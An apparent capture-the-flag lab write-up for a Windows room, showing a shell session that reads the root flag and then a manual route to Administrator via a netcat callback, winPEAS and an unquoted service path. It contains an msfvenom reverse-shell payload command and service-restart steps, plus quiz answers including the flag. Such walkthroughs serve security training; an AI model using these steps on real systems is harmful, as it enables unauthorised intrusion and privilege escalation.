cd Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\Administrator

09/26/2019  07:11 AM    <DIR>          .
09/26/2019  07:11 AM    <DIR>          ..
09/26/2019  07:11 AM    <DIR>          Contacts
10/12/2020  12:05 PM    <DIR>          Desktop
09/26/2019  07:11 AM    <DIR>          Documents
09/27/2019  07:57 AM    <DIR>          Downloads
09/26/2019  07:11 AM    <DIR>          Favorites
09/26/2019  07:11 AM    <DIR>          Links
09/26/2019  07:11 AM    <DIR>          Music
09/26/2019  07:11 AM    <DIR>          Pictures
09/26/2019  07:11 AM    <DIR>          Saved Games
09/26/2019  07:11 AM    <DIR>          Searches
09/26/2019  07:11 AM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  44,151,877,632 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\Administrator\Desktop

10/12/2020  12:05 PM    <DIR>          .
10/12/2020  12:05 PM    <DIR>          ..
10/12/2020  12:05 PM             1,528 activation.ps1
09/27/2019  05:41 AM                32 root.txt
               2 File(s)          1,560 bytes
               2 Dir(s)  44,151,877,632 bytes free

C:\Users\Administrator\Desktop>more root.txt
more root.txt
9af5f314f57607c00fd09803a587db80
```

What is the root flag? *9af5f314f57607c00fd09803a587db80*

### Access and Escalation Without Metasploit 



Now let's complete the room without the use of Metasploit.

For this we will utilise powershell and winPEAS to enumerate the system and collect the relevant information to escalate to
Answer the questions below

To begin we shall be using the same CVE. However, this time let's use this exploit.

*Note that you will need to have a web server and a netcat listener active at the same time in order for this to work!*


To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it from GitHub!

You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!
*No answer needed*



Congratulations, we're now onto the system. Now we can pull winPEAS to the system using powershell -c.

Once we run winPeas, we see that it points us towards unquoted paths. We can see that it provides us with the name of the service it is also running.

![](https://i.imgur.com/OyEdJ27.png)

What powershell -c command could we run to manually find out the service name?

*Format is "powershell -c "command here"*
*powershell -c "Get-Service"*

Now let's escalate to Administrator with our new found knowledge.

Generate your payload using msfvenom and pull it to the system using powershell.


Now we can move our payload to the unquoted directory winPEAS alerted us to and restart the service with two commands.

First we need to stop the service which we can do like so;

sc stop AdvancedSystemCareService9

Shortly followed by;

sc start AdvancedSystemCareService9

Once this command runs, you will see you gain a shell as Administrator on our listener! 
(msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP> LPORT=443 -e x86/shikata_ga_nai -f exe -o Advanced.exe)
*No answer needed*

[[Active Directory Basics(1)]]